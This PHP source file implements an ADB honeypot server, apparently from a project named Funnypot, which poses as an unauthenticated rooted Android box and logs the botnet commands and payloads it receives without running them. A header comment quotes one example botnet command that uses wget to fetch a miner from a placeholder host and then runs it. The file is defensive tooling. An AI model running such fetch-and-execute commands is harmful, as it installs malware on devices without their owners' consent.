<?php

declare(strict_types=1);

namespace Funnypot\Protocol\Adb;

/**
 * Zero-dependency, single-process TCP server for the low-interaction ADB honeypot (port 5555).
 * Speaks just enough of the Android Debug Bridge transport (the 24-byte message header + payload) in
 * pure PHP, on a non-blocking stream_select event loop, to bait the Mirai/cryptominer botnets that
 * hunt insecure ADB and harvest the commands and payloads they push.
 *
 * Deliberately tier-1 and 100% inert. The box presents as a rooted, auth-free device (the state cheap
 * Android boxes ship in), so a botnet completes its connect and immediately pushes work:
 * - On A_CNXN the client's connect banner is captured and we answer A_CNXN with a fake device banner,
 *   with NO A_AUTH challenge (an unauthenticated device is exactly the target these tools want).
 * - On A_OPEN the payload is the requested service string. `shell:<cmd>` / `exec:<cmd>` carry the
 *   commands botnets run (e.g. "shell:cd /data/local/tmp; wget http://x/miner; sh miner") — the whole
 *   point — so it is captured, then the stream is answered A_OKAY, a small A_WRTE of plausible-but-fake
 *   output, and A_CLSE. A streaming service (e.g. `sync:` used by `adb push`) is left open so the bytes
 *   pushed after it can be captured too.
 * - Any A_WRTE payload the client pushes is captured and acknowledged, never written anywhere.
 *
 * Nothing is ever executed, downloaded, relayed or run: the only output is captured intel.
 */
final class AdbServer
{
    private const MAX_CONNS = 128;
    private const PER_IP_CONNS = 10;
    private const IDLE_TIMEOUT = 120; // seconds
    private const READ_CHUNK = 8192;
    private const TICK_INTERVAL_US = 200000; // 200ms

    // ADB message header is a fixed 24 bytes: six little-endian uint32 fields.
    private const HEADER_LEN = 24;
    // Per-message payload cap. A real adbd rejects a data_length beyond its advertised max; a botnet's
    // shell command is tiny and a sync push streams in <=64KB chunks, so this bounds any one message.
    private const MAX_PAYLOAD = 262144;
    // Inbound buffer guard: enough to hold one full max-size message plus a read chunk of the next.
    private const INBUF_CAP = self::MAX_PAYLOAD + 65536;
    // Cap pushed-data writes logged per connection so a flood cannot flood the event stream.
    private const MAX_PUSHED_LOGS = 16;

    // ADB command constants (the ASCII of the command name read as a little-endian uint32).
    public const A_SYNC = 0x434e5953;
    public const A_CNXN = 0x4e584e43;
    public const A_OPEN = 0x4e45504f;
    public const A_OKAY = 0x59414b4f;
    public const A_CLSE = 0x45534c43;
    public const A_WRTE = 0x45545257;
    public const A_AUTH = 0x48545541;

    private int $listenPort = 5555;

    /**
     * @param callable(array<string,mixed>):void $logger
     */
    public function __construct(
        private AdbConfig $config,
        private $logger
    ) {
    }

    /**
     * Bind and serve forever on the given address (e.g. "0.0.0.0:5555").
     */
    public function run(string $bind): void
    {
        $server = @stream_socket_server("tcp://{$bind}", $errno, $errstr);
        if ($server === false) {
            fwrite(STDERR, "funnypot-adb: cannot bind {$bind}: {$errstr}\n");

            return;
        }
        stream_set_blocking($server, false);
        $this->listenPort = self::portOf($bind);
        fwrite(STDERR, "funnypot-adb listening on {$bind}\n");

        /** @var array<int,array{sock:resource,session:AdbSession,ip:string}> $conns */
        $conns = [];
        $perIp = [];

        while (true) {
            $read = [$server];
            $write = [];
            foreach ($conns as $c) {
                $read[] = $c['sock'];
                if ($c['session']->outbuf !== '') {
                    $write[] = $c['sock'];
                }
            }
            $except = [];

            if (@stream_select($read, $write, $except, 0, self::TICK_INTERVAL_US) === false) {
                continue;
            }

            $now = time();

            foreach ($read as $r) {
                if ($r === $server) {
                    $this->accept($server, $conns, $perIp, $now);
                    continue;
                }

                $id = get_resource_id($r);
                if (!isset($conns[$id])) {
                    continue;
                }

                $session = $conns[$id]['session'];
                $data = @fread($r, self::READ_CHUNK);

                if ($data === false || ($data === '' && feof($r))) {
                    $this->close($conns, $perIp, $id);
                    continue;
                }
                if ($data === '') {
                    continue;
                }

                $session->lastActiveTime = $now;
                $session->inbuf .= $data;

                // Guard against inbound buffer exhaustion.
                if (strlen($session->inbuf) > self::INBUF_CAP) {
                    $this->close($conns, $perIp, $id);
                    continue;
                }

                // Fault isolation: a malformed message must close only this connection, never escape
                // the loop and crash the listener (degrade, never crash).
                try {
                    $this->processInbound($session);
                } catch (\Throwable $e) {
                    $this->logFault($conns[$id]['ip'] ?? '', $e);
                    $this->close($conns, $perIp, $id);
                    continue;
                }
                if ($session->close && $session->outbuf === '') {
                    $this->close($conns, $perIp, $id);
                    continue;
                }
            }

            foreach ($write as $w) {
                $id = get_resource_id($w);
                if (!isset($conns[$id])) {
                    continue;
                }
                $session = $conns[$id]['session'];
                if ($session->outbuf === '') {
                    continue;
                }

                $written = @fwrite($w, $session->outbuf);
                if ($written === false) {
                    $this->close($conns, $perIp, $id);
                    continue;
                }
                $session->outbuf = substr($session->outbuf, $written);

                // A close deferred until its queued reply drained can now happen.
                if ($session->close && $session->outbuf === '') {
                    $this->close($conns, $perIp, $id);
                }
            }

            foreach ($conns as $id => $c) {
                if ($now - $c['session']->lastActiveTime > self::IDLE_TIMEOUT) {
                    $this->close($conns, $perIp, $id);
                }
            }
        }
    }

    private function accept($server, array &$conns, array &$perIp, int $now): void
    {
        $sock = @stream_socket_accept($server, 0);
        if ($sock === false) {
            return;
        }
        stream_set_blocking($sock, false);

        $name = (string) @stream_socket_get_name($sock, true);
        $ip = ($colon = strrpos($name, ':')) !== false ? substr($name, 0, $colon) : $name;
        $clientPort = ($colon !== false) ? (int) substr($name, $colon + 1) : 0;

        if (count($conns) >= self::MAX_CONNS || ($perIp[$ip] ?? 0) >= self::PER_IP_CONNS) {
            @fclose($sock);

            return;
        }

        $id = get_resource_id($sock);
        $session = new AdbSession($ip, $clientPort, $id);

        $conns[$id] = ['sock' => $sock, 'session' => $session, 'ip' => $ip];
        $perIp[$ip] = ($perIp[$ip] ?? 0) + 1;

        $this->logEvent([
            'event' => 'connect',
            'ip' => $ip,
            'port' => $this->listenPort,
            'path' => "ADB connection from {$ip}:{$clientPort}",
        ]);
    }

    private function close(array &$conns, array &$perIp, int $id): void
    {
        if (!isset($conns[$id])) {
            return;
        }
        $ip = $conns[$id]['ip'];
        @fclose($conns[$id]['sock']);
        unset($conns[$id]);

        if (isset($perIp[$ip])) {
            $perIp[$ip]--;
            if ($perIp[$ip] <= 0) {
                unset($perIp[$ip]);
            }
        }
    }

    /**
     * Frames the inbound stream into ADB messages and dispatches each one. Safe to drive directly with
     * raw bytes in tests.
     */
    public function processInbound(AdbSession $s): void
    {
        while (true) {
            if ($s->close) {
                return;
            }
            if (strlen($s->inbuf) < self::HEADER_LEN) {
                return; // need a full 24-byte header first
            }

            $command = self::le32($s->inbuf, 0);
            $arg0 = self::le32($s->inbuf, 4);
            $arg1 = self::le32($s->inbuf, 8);
            $dataLen = self::le32($s->inbuf, 12);
            // data_crc32 at offset 16 is ignored: real adbd does not verify it, and a botnet's crafted
            // client often leaves it wrong or zero.
            $magic = self::le32($s->inbuf, 20);

            if ($magic !== (($command ^ 0xFFFFFFFF) & 0xFFFFFFFF)) {
                // Bad magic means this is not an ADB header — a non-ADB probe (HTTP, TLS) or junk.
                $this->logUnknown($s, sprintf('bad magic 0x%08X for command 0x%08X', $magic, $command));
                $s->close = true;

                return;
            }

            if ($dataLen > self::MAX_PAYLOAD) {
                $this->logUnknown($s, "oversize payload {$dataLen}");
                $s->close = true;

                return;
            }
            if (strlen($s->inbuf) < self::HEADER_LEN + $dataLen) {
                return; // wait for the rest of the payload
            }

            $payload = substr($s->inbuf, self::HEADER_LEN, $dataLen);
            $s->inbuf = substr($s->inbuf, self::HEADER_LEN + $dataLen);

            $this->handleMessage($s, $command, $arg0, $arg1, $payload);
            if ($s->close) {
                return;
            }
        }
    }

    private function handleMessage(AdbSession $s, int $command, int $arg0, int $arg1, string $payload): void
    {
        switch ($command) {
            case self::A_CNXN:
                $this->handleConnect($s, $arg0, $arg1, $payload);
                break;

            case self::A_OPEN:
                $this->handleOpen($s, $arg0, $payload);
                break;

            case self::A_WRTE:
                $this->handleWrite($s, $arg0, $arg1, $payload);
                break;

            case self::A_CLSE:
                $this->handleClientClose($s, $arg0, $arg1);
                break;

            case self::A_OKAY:
                // Acknowledgement of a message we sent; nothing to do.
                break;

            case self::A_AUTH:
            case self::A_SYNC:
                // Recognised transport messages we do not model. The device presents as auth-free, so a
                // client offering AUTH keys is simply not answered; record it and keep the link open.
                $this->logUnknown($s, sprintf('unmodelled command 0x%08X', $command));
                break;

            default:
                $this->logUnknown($s, sprintf('unknown command 0x%08X', $command));
                $s->close = true;
        }
    }

    /**
     * Captures the client's connect banner and answers A_CNXN advertising the fake device — with no
     * A_AUTH challenge, so the device reads as unauthenticated and the client proceeds to push work.
     */
    private function handleConnect(AdbSession $s, int $version, int $maxData, string $payload): void
    {
        $banner = rtrim($payload, "\x00");
        $s->clientVersion = $version;
        $s->clientMaxData = $maxData;
        $s->clientBanner = self::printable($banner);
        $s->connected = true;

        $this->logEvent([
            'event' => 'adb_connect',
            'ip' => $s->ip,
            'port' => $s->port,
            'path' => sprintf(
                'ADB connect version=0x%08X maxdata=%d banner=%s',
                $version,
                $maxData,
                $s->clientBanner
            ),
            'body' => $s->clientBanner,
            'severity' => 'medium',
        ]);

        $s->outbuf .= self::buildMessage(
            self::A_CNXN,
            AdbConfig::VERSION,
            $this->config->maxData,
            $this->config->deviceBanner() . "\x00"
        );
    }

    /**
     * Captures the requested service string (the command a botnet wants to run) and answers the stream.
     * A shell/exec service is answered A_OKAY + a small fake-output A_WRTE + A_CLSE; a streaming service
     * (e.g. sync:) is left open so the bytes pushed after it can be captured.
     */
    private function handleOpen(AdbSession $s, int $remoteId, string $payload): void
    {
        $service = rtrim($payload, "\x00");
        $printable = self::printable($service);

        $this->logEvent([
            'event' => 'adb_open',
            'ip' => $s->ip,
            'port' => $s->port,
            'path' => 'ADB open service=' . $printable,
            'body' => $printable,
            'service' => $printable,
            'severity' => 'high',
        ]);

        $ourId = $s->nextLocalId++;
        $s->streams[$remoteId] = $ourId;

        // Accept the stream.
        $s->outbuf .= self::buildMessage(self::A_OKAY, $ourId, $remoteId, '');

        if (self::isShellService($service)) {
            $output = self::fakeShellOutput($service);
            if ($output !== '') {
                $s->outbuf .= self::buildMessage(self::A_WRTE, $ourId, $remoteId, $output);
            }
            $s->outbuf .= self::buildMessage(self::A_CLSE, $ourId, $remoteId, '');
            unset($s->streams[$remoteId]); // request/response service: closed on our side
        }
        // Otherwise the stream stays open to capture whatever the client pushes next.
    }

    /**
     * Captures payload bytes pushed on an open stream (shell stdin, or the file bytes of a sync push
     * carrying a dropper/miner) and acknowledges them. Nothing is written anywhere.
     */
    private function handleWrite(AdbSession $s, int $remoteId, int $ourId, string $payload): void
    {
        if ($payload !== '' && $s->pushedLogCount < self::MAX_PUSHED_LOGS) {
            $s->pushedLogCount++;
            $this->logEvent([
                'event' => 'adb_open',
                'ip' => $s->ip,
                'port' => $s->port,
                'path' => sprintf('ADB stream write: %d bytes pushed', strlen($payload)),
                'body' => self::printable(substr($payload, 0, 512)),
                'bytes' => strlen($payload),
                'hex' => bin2hex(substr($payload, 0, 64)),
                'severity' => 'high',
            ]);
        }

        // Acknowledge so the client keeps streaming (more bytes = more intel). arg1 is our stream id,
        // arg0 the client's — echo them back so the A_OKAY addresses the right stream.
        $s->outbuf .= self::buildMessage(self::A_OKAY, $ourId, $remoteId, '');
    }

    /** A client-initiated stream close: drop the stream and echo a close for it if we still hold it. */
    private function handleClientClose(AdbSession $s, int $remoteId, int $ourId): void
    {
        if (isset($s->streams[$remoteId])) {
            $mine = $s->streams[$remoteId];
            unset($s->streams[$remoteId]);
            $s->outbuf .= self::buildMessage(self::A_CLSE, $mine, $remoteId, '');
        }
    }

    /** True for services that are request/response (a command run and its output), not byte streams. */
    private static function isShellService(string $service): bool
    {
        return str_starts_with($service, 'shell:')
            || str_starts_with($service, 'shell,')
            || str_starts_with($service, 'exec:');
    }

    /**
     * Plausible-but-fake stdout for a captured shell command. Canned persona strings only — the command
     * is never run, nothing is fetched, and unmatched commands return empty output (as many real ones
     * do). The device persona is a rooted ARM box, matching the insecure targets these botnets hunt.
     */
    public static function fakeShellOutput(string $service): string
    {
        $colon = strpos($service, ':');
        $cmd = $colon !== false ? substr($service, $colon + 1) : $service;

        if (str_contains($cmd, 'uname')) {
            return "Linux localhost 4.4.83 #1 SMP PREEMPT armv7l\n";
        }
        if (preg_match('/\bid\b/', $cmd)) {
            return "uid=0(root) gid=0(root) groups=0(root)\n";
        }
        if (str_contains($cmd, '/proc/cpuinfo')) {
            return "Processor\t: ARMv7 Processor rev 1 (v7l)\nprocessor\t: 0\nHardware\t: rk3288\n";
        }
        if (str_contains($cmd, 'getprop')) {
            return "[ro.product.model]: [rk3288]\n[ro.product.name]: [rk3288]\n[ro.build.version.release]: [7.1.2]\n";
        }
        if (str_contains($cmd, 'whoami')) {
            return "root\n";
        }

        return '';
    }

    // ---- Message encode / decode --------------------------------------------------------------

    /**
     * Builds one ADB message: the 24-byte header (command, arg0, arg1, data_length, data_crc32,
     * magic=~command) followed by the payload. The checksum is the classic adbd byte-sum of the
     * payload; the magic is the one's-complement of the command, which real clients verify.
     */
    public static function buildMessage(int $command, int $arg0, int $arg1, string $payload): string
    {
        $magic = ($command ^ 0xFFFFFFFF) & 0xFFFFFFFF;

        return pack('V', $command)
            . pack('V', $arg0)
            . pack('V', $arg1)
            . pack('V', strlen($payload))
            . pack('V', self::checksum($payload))
            . pack('V', $magic)
            . $payload;
    }

    /** The ADB payload checksum: the sum of the payload bytes, truncated to 32 bits. */
    public static function checksum(string $payload): int
    {
        $sum = 0;
        $len = strlen($payload);
        for ($i = 0; $i < $len; $i++) {
            $sum = ($sum + ord($payload[$i])) & 0xFFFFFFFF;
        }

        return $sum;
    }

    /** Reads a little-endian uint32 at $off. Returns the unsigned value (PHP ints are 64-bit). */
    private static function le32(string $b, int $off): int
    {
        return ord($b[$off])
            | (ord($b[$off + 1]) << 8)
            | (ord($b[$off + 2]) << 16)
            | (ord($b[$off + 3]) << 24);
    }

    // ---- Logging ------------------------------------------------------------------------------

    private function logUnknown(AdbSession $s, string $detail): void
    {
        $this->logEvent([
            'event' => 'adb_unknown',
            'ip' => $s->ip,
            'port' => $s->port,
            'path' => 'ADB unmodelled input: ' . $detail,
        ]);
    }

    /**
     * @param array<string,mixed> $entry
     */
    private function logEvent(array $entry): void
    {
        $entry['ts'] = gmdate('c');
        $entry['severity'] = $entry['severity'] ?? 'medium';
        $entry['method'] = 'ADB';
        $entry['proto'] = 'adb';
        $entry['matched'] = 1;
        $entry['served'] = 1;
        // FP-0247 (Fix A): TCP accept ⇒ source verified by the three-way handshake, so reportable.
        // `??=` so a per-event override (e.g. an explicit false) stays authoritative.
        $entry['reportable'] ??= true;
        ($this->logger)($entry);
    }

    /** Records a per-connection fault to the event stream without ever escaping the run loop. */
    private function logFault(string $ip, \Throwable $e): void
    {
        try {
            $this->logEvent([
                'event' => 'error',
                'ip' => $ip,
                'port' => $this->listenPort,
                'path' => 'ADB internal fault: ' . $e->getMessage(),
                'severity' => 'low',
            ]);
        } catch (\Throwable $ignored) {
            // keeping the listener alive matters more than this one log line
        }
    }

    /** Replaces control / non-printable bytes so attacker-supplied strings stay log-safe. */
    private static function printable(string $s): string
    {
        return preg_replace('/[^\x20-\x7E]/', '.', $s) ?? '';
    }

    private static function portOf(string $bind): int
    {
        $colon = strrpos($bind, ':');

        return $colon !== false ? (int) substr($bind, $colon + 1) : 5555;
    }
}
